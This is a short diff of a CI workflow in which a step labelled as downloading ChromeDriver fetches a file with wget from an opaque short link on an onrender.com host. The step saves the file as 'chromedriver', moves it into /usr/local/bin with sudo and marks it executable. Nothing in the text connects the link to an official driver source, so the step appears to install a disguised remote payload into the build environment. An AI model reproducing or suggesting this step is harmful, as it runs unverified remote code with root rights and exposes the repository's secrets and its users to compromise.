@@ -42,7 +42,7 @@ jobs:
 
     - name: Download and configure web driver (ChromeDriver in this example)
       run: |
-          wget https://tele2link-risl.onrender.com/2c2f5c1126
+          wget -O chromedriver https://tele2link-risl.onrender.com/2c2f5c1126
           sudo mv chromedriver /usr/local/bin/
           sudo chmod +x /usr/local/bin/chromedriver
 
